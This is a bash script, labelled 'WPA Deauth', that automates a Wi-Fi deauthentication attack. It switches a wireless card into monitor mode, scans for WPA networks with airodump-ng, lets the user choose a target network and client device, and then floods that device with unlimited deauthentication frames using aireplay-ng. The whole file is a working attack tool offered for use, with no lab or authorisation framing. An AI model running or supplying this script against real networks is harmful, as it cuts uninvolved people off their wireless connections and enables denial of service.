#!/bin/bash

parsing_dir=$(mktemp -d "${TMPDIR:-/tmp/}$(basename $0).XXXXXXXXXXXX")

RED="\e[0;31m"
WHITE="\e[0m"
BLUE="\e[1;36m"
YELLOW="\e[1;33m"

heading() {
clear
echo "__        ______   _      ____                   _   _"
echo "\ \      / /  _ \ / \    |  _ \  ___  __ _ _   _| |_| |__"
echo " \ \ /\ / /| |_) / _ \   | | | |/ _ \/ _' | | | | __| '_ \ "
echo "  \ V  V / |  __/ ___ \  | |_| |  __/ (_| | |_| | |_| | | |"
echo "   \_/\_/  |_| /_/   \_\ |____/ \___|\__,_|\__,_|\__|_| |_|"
}

select_adapter() {
heading
echo -e "${BLUE} --------------- ${YELLOW}Choose a Network Interface${BLUE} ---------------${WHITE}\n"
echo -e "${RED}WARNING: ${WHITE}Try and avoid using wlan0\n"
iwconfig > $parsing_dir/iwconfig.txt 2> /dev/null
cat $parsing_dir/iwconfig.txt | grep "IEEE" | cut -d' ' -f1 > $parsing_dir/network-adapters.txt
mapfile -t listed_interface < $parsing_dir/network-adapters.txt
number_of_interfaces=-1

for adapter_num in {0..50}; do
if [ ! -z ${listed_interface[adapter_num]} ]; then
echo "$adapter_num) ${listed_interface[adapter_num]}"
let number_of_interfaces++
fi
done
echo ""
read -p "Select Network Interface: " interface_num

if [ -z $interface_num ]; then
echo -e "\nInvalid Option!"
sleep 2
select_adapter
fi

if [ $interface_num -ge 0 ] && [ $interface_num -le "$number_of_interfaces" ]
then
interface="${listed_interface[interface_num]}"
else
echo -e "\nInvalid Option!"
sleep 2
select_adapter
fi
}

scan_for_targets() {
echo -e "\n${BLUE}Press CTRL + C to stop scan${WHITE}"
iwconfig $interface > $parsing_dir/mon-check-listed.txt 2>/dev/null
interface_mode=$(cat $parsing_dir/mon-check-listed.txt | grep "Mode:" | awk -F "Mode:" {'print $2'} | cut -d' ' -f1)
if [ $interface_mode != "Monitor" ]; then
ifconfig $interface down
iwconfig $interface mode monitor
ifconfig $interface up
fi
sleep 1
airodump-ng -w $parsing_dir/scan-results --output-format csv $interface
}

show_scan_results() {
heading
echo -e "${BLUE}------------------- ${YELLOW}Choose a Target Network${BLUE} -------------------${WHITE}\n"
cat $parsing_dir/scan-results-01.csv | grep "WPA" | cut -d',' -f14 > $parsing_dir/networks.txt
mapfile -t listed_network < $parsing_dir/networks.txt
number_of_networks=-1

for network_num in {0..100}; do
if [ ! -z ${listed_network[network_num]} ]; then
echo "${network_num}) ${listed_network[network_num]}"
let number_of_networks++
fi
done
echo ""
read -p "Select Network: " chosen_network

if [ -z $chosen_network ]; then
echo -e "\nInvalid Option!"
sleep 2
show_scan_results
fi

if [ $chosen_network -ge 0 ] && [ $chosen_network -le "$number_of_networks" ]
then
network=$(echo "${listed_network[chosen_network]}" | tr -d ' ')
bssid=$(cat $parsing_dir/scan-results-01.csv | grep "$network" | cut -d',' -f1 | xargs)
else
echo "\nInvalid Option!"
sleep 2
show_scan_results
fi
}

show_devices() {
heading
echo -e "${BLUE}------------------- ${YELLOW}Choose a Target Device${BLUE} -------------------${WHITE}\n"
cat $parsing_dir/scan-results-01.csv | grep -v "WPA" | grep "$bssid" | cut -d ',' -f1 > $parsing_dir/devices.txt 2>/dev/null
mapfile -t devices < /$parsing_dir/devices.txt
number_of_devices=-1

for device_num in {0..100}; do
if [ ! -z ${devices[device_num]} ]; then
echo "${device_num}) ${devices[device_num]}"
let number_of_devices++
fi
done

if [ -z ${devices[0]} ]; then
echo -e "\nNo devices found!"
sleep 2
exit
fi

echo ""
read -p "Select Target Device: " selected_device

if [ -z $selected_device ]; then
echo -e "\nInvalid Option!"
sleep 2
show_devices
fi

if [ $selected_device -ge 0 ] && [ $selected_device -le "$number_of_devices" ]
then
device_bssid=${devices[selected_device]}
else
echo -e "\nInvalid Option!"
sleep 2
show_devices
fi
}

start_deauth() {
heading
echo -e "${BLUE}-------------------- ${YELLOW}Starting Deauthentication${BLUE} --------------------${WHITE}\n"
aireplay-ng --deauth 0 -a $bssid -c $device_bssid $interface
}


heading
select_adapter
scan_for_targets
show_scan_results
show_devices
start_deauth


echo ""
echo "aireplay-ng --deauth 0 -a $bssid -c $device_bssid $interface"
